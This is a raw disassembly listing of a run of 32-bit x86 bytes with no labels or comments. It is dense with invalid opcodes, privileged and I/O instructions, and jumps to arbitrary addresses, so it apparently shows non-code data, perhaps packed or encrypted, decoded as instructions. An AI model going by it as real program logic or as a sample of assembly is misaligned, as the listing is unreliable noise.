  4253bb:	ins    DWORD PTR es:[edi],dx
  4253bc:	(bad)  
  4253bd:	fldenv [ebp-0x62bff81b]
  4253c3:	xchg   ecx,eax
  4253c4:	xchg   edi,eax
  4253c5:	add    ebx,DWORD PTR [ecx+0x75]
  4253c8:	popf   
  4253c9:	hlt    
  4253ca:	mov    bl,0x23
  4253cc:	jb     0x4253dd
  4253ce:	out    0x65,al
  4253d0:	lock mov edi,0x8724d36c
  4253d6:	jbe    0x42539a
  4253d8:	sar    BYTE PTR [ebp+0x40155ee7],0xed
  4253df:	(bad)  
  4253e0:	cld    
  4253e1:	sub    ch,BYTE PTR [ebp-0x2b6b4fa1]
  4253e7:	shl    ebp,1
  4253e9:	mov    ebp,0x217b3864
  4253ee:	(bad)  
  4253ef:	arpl   WORD PTR ds:0x1cefcb44,di
  4253f5:	ja     0x4253ca
  4253f7:	xor    al,ah
  4253f9:	stos   BYTE PTR es:[edi],al
  4253fa:	rol    edx,cl
  4253fc:	mov    dl,0x94
  4253fe:	(bad)  
  4253ff:	jg     0x4253fc
  425401:	jne    0x4253fd
  425403:	cmp    esp,DWORD PTR [ebp-0x7ce678ee]
  425409:	mov    bh,0xcc
  42540b:	xor    al,0xc0
  42540d:	aas    
  42540e:	and    DWORD PTR [ebx+esi*2+0x7023dafe],esi
  425415:	fs pusha 
  425417:	jp     0x425433
  425419:	mov    esp,0x45217c14
  42541e:	icebp  
  42541f:	cmp    DWORD PTR [ecx],esi
  425421:	nop
  425422:	cmp    dl,BYTE PTR [ecx-0x50]
  425425:	mov    WORD PTR [ebx-0x52],ss
  425428:	xor    DWORD PTR [eax-0x6],esi
  42542b:	or     eax,0xda0d807c
  425430:	mov    edi,0x9d20e87c
  425435:	js     0x425456
  425437:	cmp    DWORD PTR [ebx+0x20a1ffd8],0xffffff8d
  42543e:	mov    bl,0x92
  425440:	push   ebp
  425441:	mov    ds,WORD PTR [eax+0x71f6e946]
  425447:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425448:	lods   eax,DWORD PTR ds:[esi]
  425449:	xchg   ebp,eax
  42544a:	inc    esi
  42544b:	fisttp WORD PTR [eax]
  42544d:	sar    ecx,0x44
  425450:	push   ebx
  425451:	fucomi st,st(4)
  425453:	dec    ebx
  425454:	push   ebp
  425455:	hlt    
  425456:	dec    esi
  425457:	mov    cl,0x49
  425459:	xor    eax,0x3876f185
  42545e:	enter  0xdea1,0x9c
  425462:	rcl    ebp,1
  425464:	push   eax
  425465:	sub    eax,0xda781d13
  42546a:	xor    cl,BYTE PTR [ecx+0x208ccfd1]
  425470:	cmp    al,0xbe
  425472:	fcmovnbe st,st(1)
  425474:	mov    bh,0x6d
  425476:	lea    esi,[ebx+0x12]
  425479:	or     al,0x76
  42547b:	add    ch,BYTE PTR [ebx+0x65]
  42547e:	mov    ds:0x38f1e2ca,eax
  425483:	pop    esi
  425484:	and    eax,esp
  425486:	mov    ch,BYTE PTR [esi]
  425488:	mov    bh,BYTE PTR [ebp+0x4cd970cf]
  42548e:	pop    ecx
  42548f:	xchg   esi,eax
  425490:	retf   
  425491:	sbb    ebp,DWORD PTR [edx+ebx*1-0x32]
  425495:	fwait
  425496:	dec    ebp
  425497:	es mov dh,0x86
  42549a:	cs jg  0x4254b6
  42549d:	inc    ecx
  42549e:	sbb    al,0x24
  4254a0:	cs cld 
  4254a2:	push   edx
  4254a3:	std    
  4254a4:	aad    0xcd
  4254a6:	out    0xc1,eax
  4254a8:	int3   
  4254a9:	test   al,0x6c
  4254ab:	xchg   BYTE PTR [edx],ch
  4254ad:	adc    eax,eax
  4254af:	fchs   
  4254b1:	push   ebp
  4254b2:	jle    0x4254d7
  4254b4:	gs (bad) 
  4254b6:	mov    bh,cl
  4254b8:	iret   
  4254b9:	push   ebx
  4254ba:	loopne 0x4254af
  4254bc:	jns    0x4254e2
  4254be:	retf   0x6bb2
  4254c1:	cmp    esi,ebx
  4254c3:	(bad)  
  4254c4:	xchg   esp,eax
  4254c5:	gs iret 
  4254c7:	nop
  4254c8:	sub    edi,edi
  4254ca:	ret    0x6c71
  4254cd:	and    al,0xd7
  4254cf:	inc    esp
  4254d0:	neg    BYTE PTR [edx+0x30a69273]
  4254d6:	adc    DWORD PTR [edx+0x2],edi
  4254d9:	call   0x89d7fa72
  4254de:	mov    ecx,0xa9af533c
  4254e3:	lds    edi,FWORD PTR [edi-0x2a]
  4254e6:	cmp    eax,DWORD PTR ds:0x4c2d84d6
  4254ec:	dec    eax
  4254ed:	jge    0x4254ac
  4254ef:	je     0x425522
  4254f1:	xchg   ebx,eax
  4254f2:	mov    dl,0x26
  4254f4:	jl     0x425531
  4254f6:	lea    ebp,[ebp+0x73]
  4254f9:	aaa    
  4254fa:	fs pushf 
  4254fc:	xor    DWORD PTR [eax],eax
  4254fe:	cmp    DWORD PTR [edx-0x1e0e6455],edi
  425504:	pop    esp
  425505:	lahf   
  425506:	pop    ss
  425507:	pop    esi
  425508:	pusha  
  425509:	retf   0x30bc
  42550c:	sbb    DWORD PTR [edx-0x391e6e5d],eax
  425512:	sub    edi,DWORD PTR [edx+0x6a3e8796]
  425518:	sbb    dh,0x13
  42551b:	xor    bl,BYTE PTR [edi-0x4a6fedb3]
  425521:	mov    BYTE PTR [ecx+0x62],bl
  425524:	fbstp  TBYTE PTR [eax-0x73043a2b]
  42552a:	pop    ds
  42552b:	in     al,0x5d
  42552d:	les    ecx,FWORD PTR [eax]
  42552f:	xchg   edi,eax
  425530:	nop
  425531:	mov    ecx,0x85abd8cc
  425536:	cs (bad) 
  425538:	dec    ebp
  425539:	add    esp,DWORD PTR [edx-0x46e14f40]
  42553f:	and    esp,esi
  425541:	jp     0x4254e0
  425543:	pusha  
  425544:	ret    0x3c75
  425547:	push   0x8bb19dbe
  42554c:	add    BYTE PTR [eax+0x3a],dl
  42554f:	out    dx,al
  425550:	mov    ah,0xd8
  425552:	mul    BYTE PTR [edi-0x22553745]
  425558:	cmp    BYTE PTR [edx+0x0],ch
  42555b:	add    bl,al
  42555d:	and    ecx,edx
  42555f:	dec    eax
  425560:	repz clc 
  425562:	fld    TBYTE PTR [ebx+0x202892a0]
  425568:	and    esi,DWORD PTR [edi-0x31858ee3]
  42556e:	add    DWORD PTR [eax],eax
  425570:	xchg   BYTE PTR [edx],al
  425572:	add    BYTE PTR [eax],al
  425574:	mov    BYTE PTR [edi-0x13],dl
  425577:	jecxz  0x425544
  425579:	pop    edx
  42557a:	or     dl,BYTE PTR [ecx]
  42557c:	or     al,0xa3
  42557e:	outs   dx,BYTE PTR ds:[esi]
  42557f:	push   0x5e978f73
  425584:	push   0xffffffd2
  425586:	js     0x4255c4
  425588:	inc    edx
  425589:	sahf   
  42558a:	mov    ah,0x48
  42558c:	fisub  WORD PTR [edx-0x44]
  42558f:	lods   al,BYTE PTR ds:[esi]
  425590:	pcmpeqd mm5,QWORD PTR [edi-0x7e]
  425594:	ret    
  425595:	dec    ebx
  425596:	(bad)  
  425597:	imul   edi
  425599:	jne    0x425524
  42559b:	psubsw mm4,QWORD PTR [ecx]
  42559e:	in     al,dx
  42559f:	es js  0x4255fc
  4255a2:	inc    edx
  4255a3:	fcmovne st,st(4)
  4255a5:	out    0xb2,eax
  4255a7:	adc    ah,ch
  4255a9:	jmp    0x517adfc5
  4255ae:	stc    
  4255af:	mov    dl,0x7e
  4255b1:	inc    edi
  4255b2:	lahf   
  4255b3:	cli    
  4255b4:	das    
  4255b5:	jecxz  0x425589
  4255b7:	fnstcw WORD PTR [ebx]
  4255b9:	adc    dh,BYTE PTR [eax+0x4f2d305d]
  4255bf:	pop    ebx
  4255c0:	in     eax,dx
  4255c1:	fidivr DWORD PTR [ebx-0x48112d03]
  4255c7:	ins    BYTE PTR es:[edi],dx
  4255c8:	mov    ch,0x53
  4255ca:	fisttp DWORD PTR [ebx+eiz*2-0x6d289fce]
  4255d1:	cmp    DWORD PTR [ecx+0x4ce4d865],0xffffffe8
  4255d8:	jo     0x4255ad
  4255da:	adc    eax,0x98003d98
  4255df:	mov    esi,ebp
  4255e1:	popf   
  4255e2:	cmp    BYTE PTR [ebx],cl
  4255e4:	fs bnd jle 0x4255bc
  4255e8:	or     al,0x43
  4255ea:	gs (bad) 
  4255ec:	test   eax,0xa7684fc2
  4255f1:	enter  0x43dd,0xeb
  4255f5:	ffree  st(0)
  4255f7:	shr    ebp,1
  4255f9:	call   0x1fd9:0xbbd4d001
  425600:	ret    
  425601:	fwait
  425602:	xchg   DWORD PTR [esi-0x79],ebx
  425605:	dec    eax
  425606:	lods   al,BYTE PTR ds:[esi]
  425607:	pop    esp
  425608:	test   al,0xcf
  42560a:	xchg   ebp,eax
  42560b:	inc    eax
  42560c:	cmp    eax,0xbde4d9b4
  425611:	fadd   st,st(0)
  425613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425614:	and    DWORD PTR [edi],0x10
  425617:	lock add eax,0x140e4838
  42561d:	int    0x14
  42561f:	int    0x55
  425621:	aaa    
  425622:	mov    bl,0x14
  425624:	fcom   DWORD PTR [edi-0x49]
  425627:	out    dx,eax
  425628:	pop    es
  425629:	rol    DWORD PTR [edi-0x68edc43a],cl
  42562f:	dec    edx
  425630:	jle    0x425646
  425632:	xor    cl,BYTE PTR [ebp+0x769f3417]
  425638:	inc    ebp
  425639:	push   eax
  42563a:	es jge 0x4255f3
  42563d:	jmp    0x7530c7ba
  425642:	repnz mov ds:0x6f8970ec,al
  425648:	inc    ebp
  425649:	push   esi
  42564a:	int3   
  42564b:	into   
  42564c:	nop
  42564d:	(bad)  
  42564f:	scas   al,BYTE PTR es:[edi]
  425650:	sahf   
  425651:	pop    edx
  425652:	sbb    BYTE PTR [ebx-0x19],bh
  425655:	sbb    bl,BYTE PTR [edx-0x4a5e8836]
  42565b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42565c:	fldenv [esp+edi*4+0x100f17c4]
  425663:	ficomp DWORD PTR [esi-0x2d]
  425666:	xchg   ebp,eax
  425667:	sub    eax,0x541d0f7d
  42566c:	fsub   QWORD PTR [edi-0x1049ecc0]
  425672:	mov    edi,0xf68bc51c
  425677:	loope  0x425603
  425679:	inc    ecx
  42567a:	rol    ch,1
  42567c:	push   cs
  42567d:	inc    ecx
  42567e:	fs das 
  425680:	mov    ebp,DWORD PTR [edi+0x3b]
  425683:	sbb    DWORD PTR [esi+0x1b],eax
  425686:	jno    0x425646
  425688:	and    al,BYTE PTR [ecx]
  42568a:	aas    
  42568b:	idiv   DWORD PTR [edi-0x3c]
  42568e:	call   0xf577:0x4a714b51
  425695:	aad    0x77
  425697:	xor    al,0xfd
  425699:	jg     0x4256d3
  42569b:	popa   
  42569c:	shl    bh,cl
  42569e:	fadd   st,st(2)
  4256a0:	adc    ecx,edx
  4256a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256a3:	adc    al,cl
  4256a5:	cmp    dl,BYTE PTR [ecx-0x70]
  4256a8:	dec    ebp
  4256a9:	ret    
  4256aa:	sahf   
  4256ab:	outs   dx,BYTE PTR ds:[esi]
  4256ac:	add    eax,0x19af844
  4256b1:	gs xchg esp,eax
  4256b3:	pusha  
  4256b4:	dec    esi
  4256b5:	or     eax,DWORD PTR [ecx]
  4256b7:	fwait
  4256b8:	sbb    ebx,esi
  4256ba:	(bad)  [edi]
  4256bc:	fs pop ecx
  4256be:	lahf   
  4256bf:	and    eax,0xe62211cb
  4256c4:	rcl    BYTE PTR [edi+esi*4+0x7c3d5ee6],1
  4256cb:	mov    ch,0xd3
  4256cd:	mov    eax,ds:0xd273dc90
  4256d2:	pop    ecx
  4256d3:	add    eax,0x277274da
  4256d8:	inc    eax
  4256d9:	xchg   esi,eax
  4256da:	(bad)  
  4256db:	sub    eax,0x25c47d0d
  4256e0:	(bad)  
  4256e1:	ss mov eax,0x42876c6b
  4256e7:	(bad)  [ebx+0x3b6a11f6]
  4256ed:	jns    0x42571f
  4256ef:	retf   
  4256f0:	jne    0x425741
  4256f2:	push   cs
  4256f3:	pushf  
  4256f4:	arpl   WORD PTR [esi-0x7d6e378a],di
  4256fa:	aad    0x9a
  4256fc:	xor    edx,ecx
  4256fe:	and    dh,BYTE PTR [ebx+0x612530b2]
  425704:	add    esp,DWORD PTR [edi]
  425706:	pop    esp
  425707:	retf   0xb43d
  42570a:	push   edi
  42570b:	les    esi,FWORD PTR [ebp-0x3b]
  42570e:	cmp    eax,DWORD PTR [esi+0x2ca16352]
  425714:	add    al,0x71
  425716:	(bad)  
  425717:	mov    dh,0x55
  425719:	cmp    eax,edx
  42571b:	mov    esi,0xc561955f
  425720:	call   0xb4c2fc38
  425725:	gs sbb al,0xd8
  425728:	lea    ecx,[edi]
  42572a:	sbb    al,0x9d
  42572c:	cmp    ch,dl
  42572e:	xchg   ecx,eax
  42572f:	ins    BYTE PTR es:[edi],dx
  425730:	scas   al,BYTE PTR es:[edi]
  425731:	cwde   
  425732:	mov    cl,0xdd
  425734:	mov    ecx,eax
  425736:	jae    0x42576b
  425738:	dec    ebp
  425739:	(bad)  
  42573a:	stc    
  42573b:	mov    esp,ebp
  42573d:	dec    edx
  42573e:	repnz mov al,0x74
  425741:	push   cs
  425742:	push   edi
  425743:	xchg   ecx,eax
  425744:	sti    
  425745:	adc    ch,BYTE PTR [ecx+0x7b]
  425748:	out    dx,eax
  425749:	push   es
  42574a:	push   ebp
  42574b:	mov    ecx,0x6d38f43c
  425750:	xchg   ebp,eax
  425751:	add    dh,BYTE PTR [esi+0x18]
  425754:	dec    esp
  425755:	pop    esp
  425756:	in     eax,0xcb
  425758:	jl     0x425709
  42575a:	stc    
  42575b:	mov    esp,0xbed8be5
  425760:	ret    
  425761:	dec    esp
  425762:	jmp    0x350f2a1c
  425767:	adc    bl,dl
  425769:	std    
  42576a:	inc    eax
  42576b:	stos   DWORD PTR es:[edi],eax
  42576c:	add    DWORD PTR [ebx+0x45082e51],ecx
  425772:	cmp    BYTE PTR [edi],dl
  425774:	xchg   esp,eax
  425775:	fldenv [ecx+0x3eb1b1a8]
  42577b:	fadd   DWORD PTR [eax]
  42577d:	pop    edx
  42577e:	pop    ss
  42577f:	bound  edi,QWORD PTR [edi+eax*4-0x45d351c7]
  425786:	mov    ecx,0x1eef7f0a
  42578b:	addr16 inc ecx
  42578d:	xor    esi,DWORD PTR [eax-0x6b]
  425790:	neg    BYTE PTR [eax]
  425792:	(bad)  
  425793:	setb   BYTE PTR ds:0xc8f30674
  42579a:	push   0xf
  42579c:	lahf   
  42579d:	push   eax
  42579e:	or     cl,BYTE PTR [edi+ecx*1+0x2e6331d0]
  4257a5:	jae    0x4257a4
  4257a7:	out    dx,al
  4257a8:	mov    esp,0xd940edb0
  4257ad:	push   0xffffff84
  4257af:	mov    ah,0xac
  4257b1:	ret    
  4257b2:	pusha  
  4257b3:	out    dx,al
  4257b4:	shr    esp,1
  4257b6:	jge    0x4257a3
  4257b8:	adc    bh,BYTE PTR [ecx]
  4257ba:	and    ecx,esp
  4257bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257bd:	jmp    0xf227728b
  4257c2:	xor    al,0xaa
  4257c4:	cmp    esp,0x1d
  4257c7:	sbb    eax,0xed3e6611
  4257cc:	sahf   
  4257cd:	fadd   st(5),st
  4257cf:	dec    ecx
  4257d0:	add    edi,DWORD PTR [edx+eax*4-0x35]
  4257d4:	divps  xmm7,XMMWORD PTR [esi-0x3]
  4257d8:	pop    ss
  4257d9:	pop    es
  4257da:	rcr    BYTE PTR [ebx+0x26],cl
  4257dd:	adc    al,0xfd
  4257df:	fiadd  WORD PTR [edx]
  4257e1:	(bad)  
  4257e2:	test   eax,0xe78075a
  4257e7:	push   esi
  4257e8:	add    al,0x32
  4257ea:	pop    ds
  4257eb:	test   al,0x1c
  4257ed:	scas   al,BYTE PTR es:[edi]
  4257ee:	ja     0x42577a
  4257f0:	sbb    ah,dh
  4257f2:	pop    ds
  4257f3:	sub    esp,DWORD PTR [eax+edi*8+0x9]
  4257f7:	xchg   BYTE PTR [ecx],dl
  4257f9:	fadd   QWORD PTR [eax]
  4257fb:	add    BYTE PTR [edx-0x101610a7],bl
  425801:	call   FWORD PTR [esi+0x5c5d437b]
  425807:	mov    cl,0x10
  425809:	int3   
  42580a:	shl    DWORD PTR [eax+eax*1],1
  42580d:	rol    DWORD PTR [ecx],1
  42580f:	add    BYTE PTR [esi+0x13000002],al
  425815:	pop    ebp
  425816:	adc    al,0x68
  425818:	cwde   
  425819:	push   ebx
  42581a:	cmp    BYTE PTR [esi-0x51],ch
  42581d:	(bad)  
  42581e:	fidivr WORD PTR [ebx]
  425820:	mov    ?,WORD PTR [eax+0x7e]
  425823:	call   0x7821:0x77abcf26
  42582a:	mov    ch,0xe2
  42582c:	cwde   
  42582d:	xor    ebp,DWORD PTR [esi]
  42582f:	call   0x5a4706f9
  425834:	and    eax,0x115b02f7
  425839:	fwait
  42583a:	inc    eax
  42583b:	push   0x2b
  42583d:	and    ebx,DWORD PTR ds:0x347b48d8
  425843:	xchg   DWORD PTR ds:0x88448dcd,esi
  425849:	pushf  
  42584a:	stos   BYTE PTR es:[edi],al
  42584b:	xchg   ebx,esp
  42584d:	out    dx,eax
  42584e:	jle    0x425881
  425850:	xor    edx,0x75e1ce62
  425856:	dec    ebp
  425857:	sub    al,0x5f
  425859:	cmp    BYTE PTR [edx+0x3d],bh
  42585c:	jo     0x4257fe
  42585e:	jbe    0x4258c0
  425860:	das    
  425861:	and    BYTE PTR [bp+di-0x46],cl
  425865:	jo     0x4258b8
  425867:	(bad)  
  425868:	out    dx,eax
  425869:	push   cs
  42586a:	adc    edx,ecx
  42586c:	cmp    al,0x65
  42586e:	(bad)  
  42586f:	or     eax,edx
  425871:	push   ebp
  425872:	mov    ebx,esi
  425874:	scas   eax,DWORD PTR es:[edi]
  425875:	bound  eax,QWORD PTR [esi+0x65509d66]
  42587b:	pop    eax
  42587c:	jne    0x4258cb
  42587e:	ret    0xbafc
  425881:	lgs    ecx,FWORD PTR [edx+0x55]
  425885:	into   
  425886:	xchg   ecx,eax
  425887:	xor    eax,0xeeedb5b6
  42588c:	inc    ebp
  42588d:	add    DWORD PTR ds:0x4d8cde6c,esi
  425893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425894:	mov    esi,0x81d24b5c
  425899:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42589a:	(bad)  
  42589b:	and    eax,0x99215b53
  4258a0:	mov    ecx,0x9f111712
  4258a5:	div    ecx
  4258a7:	cli    
  4258a8:	mov    ebp,0x511ce5e9
  4258ad:	fild   QWORD PTR [ebx+0x12]
  4258b0:	enter  0x6487,0x96
  4258b4:	in     al,0x94
  4258b6:	jmp    0x42584a
  4258b8:	xor    cl,BYTE PTR [edx+0x4c]
  4258bb:	cli    
  4258bc:	sub    al,0x6b
  4258be:	mov    ss,WORD PTR [ecx+0x79]
  4258c1:	in     al,dx
  4258c2:	ret    0x5c68
  4258c5:	mov    dh,0x1e
  4258c7:	sbb    BYTE PTR [ebx+0x201be2d6],ah
  4258cd:	fdivr  QWORD PTR [ebp+0x539e7402]
  4258d3:	iret   
  4258d4:	xchg   DWORD PTR [edx+0x4fb8a2b3],ebx
  4258da:	call   0x7b530d0e
  4258df:	dec    eax
  4258e0:	jnp    0x4258a5
  4258e2:	cmp    al,al
  4258e4:	call   0xc161:0x43d5d47
  4258eb:	stc    
  4258ec:	je     0x42594e
  4258ee:	clc    
  4258ef:	imul   ecx,DWORD PTR [ebx-0x45],0x7d645245
  4258f6:	or     eax,DWORD PTR [esi+0x5b]
  4258f9:	jl     0x425970
  4258fb:	ins    DWORD PTR es:[edi],dx
  4258fc:	ror    BYTE PTR [edx],0x98
  4258ff:	test   DWORD PTR [edx-0x23],esi
  425902:	cld    
  425903:	jo     0x425982
  425905:	xor    al,0xa3
  425907:	pop    ebp
  425908:	maskmovq mm2,(bad)
  425909:	not    DWORD PTR [edi]
  42590b:	push   0x2531288b
  425910:	push   0xffffff9e
  425912:	cmp    ah,dl
  425914:	add    cl,BYTE PTR [edx+0x208014]
  42591a:	sti    
  42591b:	arpl   sp,sp
  42591d:	mov    WORD PTR [ebx+0x2a],ss
  425920:	jno    0x4258b0
  425922:	sar    BYTE PTR [eax+0x22],cl
  425925:	arpl   WORD PTR [ebp-0x1],dx
  425928:	out    0xd9,al
  42592a:	mov    edi,0x6d7dc38
  42592f:	pop    eax
  425930:	push   eax
  425931:	inc    esi
  425932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425933:	or     edx,DWORD PTR [ecx]
  425935:	cmp    bh,BYTE PTR [esi+0x1e]
  425938:	mov    ah,BYTE PTR ds:0x84bbde3a
  42593e:	fdivr  QWORD PTR [esi-0x467b7312]
  425944:	arpl   sp,ax
  425946:	fisub  WORD PTR [esi-0x9a9f708]
  42594c:	and    bl,dh
  42594e:	mov    dl,0x49
  425950:	ds xchg esi,eax
  425952:	lock jmp 0x566e:0xd1091461
  42595a:	dec    esi
  42595b:	push   eax
  42595c:	inc    esp
  42595d:	jne    0x4259ae
  42595f:	lahf   
  425960:	retf   0xd893
  425963:	fisttp DWORD PTR [edx+0x210f7141]
  425969:	popa   
  42596a:	cwde   
  42596b:	dec    ebx
  42596c:	cs inc bx
  42596f:	fstp   QWORD PTR [esi+0x3b]
  425972:	cmp    BYTE PTR [ebp+0x434bcac5],bl
  425978:	mov    WORD PTR [edi+eiz*4+0x43683b84],?
  42597f:	pushf  
  425980:	loope  0x425962
  425982:	sahf   
  425983:	sbb    eax,0x2a9e98b2
  425988:	loop   0x425920
  42598a:	cmp    al,0x90
  42598c:	int    0xc7
  42598e:	adc    DWORD PTR [eax-0x62],edx
  425991:	icebp  
  425992:	xor    dl,BYTE PTR [eax]
  425994:	dec    eax
  425995:	jle    0x425a0e
  425997:	mov    ebp,0x2bc74980
  42599c:	in     eax,0xbc
  42599e:	dec    ebp
  42599f:	stos   BYTE PTR es:[edi],al
  4259a0:	scas   al,BYTE PTR es:[edi]
  4259a1:	iret   
  4259a2:	lahf   
  4259a3:	out    0x9b,al
  4259a5:	inc    esi
  4259a6:	ins    BYTE PTR es:[edi],dx
  4259a7:	jp     0x4259b3
  4259a9:	mov    al,ds:0xbb37c123
  4259ae:	aas    
  4259af:	jmp    0x4259ad
  4259b1:	fwait
  4259b2:	pusha  
  4259b3:	cmp    BYTE PTR [ecx+0x2606d572],ah
  4259b9:	dec    edi
  4259ba:	xchg   ecx,eax
  4259bb:	jg     0x4259c6
  4259bd:	sub    eax,0xecb4ae3e
  4259c2:	adc    al,0x3e
  4259c4:	xor    eax,0x299b1f94
  4259c9:	js     0x42597d
  4259cb:	push   ecx
  4259cc:	sahf   
  4259cd:	icebp  
  4259ce:	fcmove st,st(0)
  4259d0:	rcr    ebp,cl
  4259d2:	dec    edx
  4259d3:	pop    ebp
  4259d4:	call   FWORD PTR [ecx-0x14d29f1e]
  4259da:	icebp  
  4259db:	jnp    0x4259da
  4259dd:	mov    WORD PTR [ebp+0x11],cs
  4259e0:	sahf   
  4259e1:	xchg   ebx,eax
  4259e2:	das    
  4259e3:	das    
  4259e4:	ret    
  4259e5:	mov    ebp,ebp
  4259e7:	mov    esp,0xd1ef2169
  4259ec:	rol    BYTE PTR [ebp+0x266c0356],0xb8
  4259f3:	cmp    al,0xb0
  4259f5:	cld    
  4259f6:	mov    fs,WORD PTR [esi]
  4259f8:	fwait
  4259f9:	mov    al,ds:0x483ef711
  4259fe:	cmp    ah,bl
  425a00:	cdq    
  425a01:	ins    DWORD PTR es:[edi],dx
  425a02:	cmp    eax,0xf8eb3662
  425a07:	mov    DWORD PTR [ecx+0x2e456f77],esi
  425a0d:	daa    
  425a0e:	ret    
  425a0f:	ret    
  425a10:	mov    esp,0x572b41ac
  425a15:	xchg   ebx,eax
  425a16:	jl     0x425a7d
  425a18:	lea    ebx,[esi+0x18d8088f]
  425a1e:	(bad)  
  425a1f:	xchg   edi,eax
  425a20:	jmp    0xec0e8ebd
  425a25:	push   ecx
  425a26:	sub    eax,0x6b03ae5e
  425a2b:	pop    ds
  425a2c:	sbb    eax,0xffffff90
  425a2f:	xor    BYTE PTR [edx-0x2d],bh
  425a32:	jl     0x425a8f
  425a34:	cmp    BYTE PTR [ebp+0x2b3cf022],bl
  425a3a:	xor    al,0xd9
  425a3c:	out    0x66,eax
  425a3e:	test   eax,0xdac240ca
  425a43:	pusha  
  425a44:	dec    esi
  425a45:	jp     0x425a59
  425a47:	jmp    0x469b:0x50a2d899
  425a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a4f:	iret   
  425a50:	mov    eax,ds:0x8d25e9f
  425a55:	fcmovbe st,st(5)
  425a57:	das    
  425a58:	dec    edx
  425a59:	push   ebp
  425a5a:	mov    eax,0xb98b38b8
  425a5f:	inc    edi
  425a60:	and    al,0x6d
  425a62:	retf   
  425a63:	or     eax,0x9470d1bf
  425a68:	push   edx
  425a69:	sbb    BYTE PTR [ebp-0x6a38807d],cl
  425a6f:	jbe    0x5d8f3f1
  425a75:	fadd   QWORD PTR [ecx]
  425a77:	adc    al,dh
  425a79:	ret    
  425a7a:	pop    esi
  425a7b:	inc    ecx
  425a7c:	inc    ecx
  425a7d:	fst    DWORD PTR [ecx+0x3474ae74]
  425a83:	jo     0x425a91
  425a85:	push   esi
  425a86:	out    0x1f,al
  425a88:	addr16 adc eax,0xa75847f3
  425a8e:	or     DWORD PTR [ebx-0x10e5d21c],esp
  425a94:	pushf  
  425a95:	xchg   ebx,eax
  425a96:	xchg   esi,eax
  425a97:	adc    eax,0xfb18
  425a9c:	(bad)  
  425a9d:	rol    BYTE PTR [edi],0x37
  425aa0:	dec    edi
  425aa1:	idiv   DWORD PTR [ebp+0x532a00fa]
  425aa7:	frstor [ecx+ecx*2-0x75]
  425aab:	pushf  
  425aac:	xchg   bl,dl
  425aae:	add    DWORD PTR [eax],eax
  425ab0:	xchg   BYTE PTR [edx],al
  425ab2:	add    BYTE PTR [eax],al
  425ab4:	inc    ebp
  425ab5:	push   esp
  425ab6:	push   es
  425ab7:	push   esp
  425ab8:	test   eax,0xb953fa7b
  425abd:	imul   ebp,DWORD PTR [ebx],0xf683a9a1
  425ac3:	int3   
  425ac4:	xor    BYTE PTR [esi+0x2a],0x27
  425ac8:	mov    edi,0x57620cd2
  425acd:	add    al,0x24
  425acf:	div    BYTE PTR [edx]
  425ad1:	add    BYTE PTR [esp+eiz*8],cl
  425ad4:	shr    al,1
  425ad6:	fabs   
  425ad8:	out    0x1d,eax
  425ada:	mov    ebp,0x9edc9b1a
  425adf:	(bad)  
  425ae0:	scas   al,BYTE PTR es:[edi]
  425ae1:	add    DWORD PTR [edi],esp
  425ae3:	js     0x425a65
  425ae5:	sbb    ch,BYTE PTR [eax+0x79]
  425ae8:	mul    BYTE PTR [eax+0x4e7f682c]
  425aee:	and    BYTE PTR [esi],bh
  425af0:	cdq    
  425af1:	push   es
  425af2:	mov    eax,ds:0x13b0f11b
  425af7:	mov    bh,BYTE PTR [esi+0x3d]
  425afa:	call   0xbe3e3d3f
  425aff:	lods   al,BYTE PTR ds:[esi]
  425b00:	add    dl,ch
  425b02:	fcom   DWORD PTR [ebx-0x52]
  425b05:	and    edx,ebp
  425b07:	lock frndint 
  425b0a:	or     bh,BYTE PTR [esi-0x50a14b37]
  425b10:	das    
  425b11:	sub    al,0x21
  425b13:	cmp    DWORD PTR [edx+0x641000aa],eax
  425b19:	pushf  
  425b1a:	sbb    bh,BYTE PTR [ecx+0x69]
  425b1d:	prefetch (bad)
  425b1e:	or     eax,0x6f76ddc1
  425b23:	mov    ebp,0x2c1d594c
  425b28:	cwde   
  425b29:	int    0x4
  425b2b:	sbb    dh,BYTE PTR [ebx+esi*8]
  425b2e:	cmp    cl,BYTE PTR [esi+0xd]
  425b31:	pop    esi
  425b32:	aad    0x87
  425b34:	pop    esi
  425b35:	jmp    0x425b54
  425b37:	test   eax,0xa65b9fe8
  425b3c:	lea    edx,[esi-0x26]
  425b3f:	lods   al,BYTE PTR ds:[esi]
  425b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b41:	fldcw  WORD PTR [ebp+0x40]
  425b44:	leave  
  425b45:	jne    0x425b46
  425b47:	sbb    DWORD PTR [edi+0x16],0x7c
  425b4b:	lock mov esi,gs
  425b4e:	mov    bl,0xd
  425b50:	and    BYTE PTR [ebp-0x32],ah
  425b53:	jb     0x425af5
  425b55:	push   0x9397fc81
  425b5a:	inc    edx
  425b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b5c:	pop    ebx
  425b5d:	adc    cl,ch
  425b5f:	jns    0x425b1d
  425b61:	(bad)  
  425b63:	outs   dx,DWORD PTR ds:[esi]
  425b64:	aam    0xa2
  425b66:	jne    0x425b6d
  425b68:	ss push es
  425b6a:	shr    BYTE PTR [ecx+ebp*8-0x7c],1
  425b6e:	cmp    ebx,ecx
  425b70:	sbb    eax,0x822d8280
  425b75:	fcomi  st,st(2)
  425b77:	adc    eax,0x1098bdb1
  425b7c:	cmc    
  425b7d:	dec    edi
  425b7e:	push   ebx
  425b7f:	enter  0x82b2,0x97
  425b83:	mov    ebx,0x497d229c
  425b88:	mov    ebx,0xa5e7c053
  425b8d:	mov    ?,WORD PTR [ebx+0xd]
  425b90:	jg     0x425bf1
  425b92:	loope  0x425b3e
  425b94:	cmp    ch,BYTE PTR [ebx]
  425b96:	call   0x4848:0xfb219bdd
  425b9d:	mov    bh,0x68
  425b9f:	adc    al,0xe0
  425ba1:	jmp    0xcb88c97c
  425ba6:	leave  
  425ba7:	add    ebx,DWORD PTR [ecx]
  425ba9:	sub    eax,0xb6e6b747
